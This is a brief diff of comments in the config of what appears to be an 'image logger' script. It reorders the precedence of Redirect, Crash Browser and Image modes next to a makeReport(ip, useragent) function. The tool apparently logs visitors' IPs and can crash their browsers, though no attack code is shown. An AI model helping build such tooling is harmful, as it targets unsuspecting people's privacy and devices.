@@ -51,7 +51,9 @@ config = {
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
     # NOTE: Hierarchy tree goes as follows:
-    # Crash Browser > Redirect > Image
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Image
 }
 
 def makeReport(ip, useragent = None):
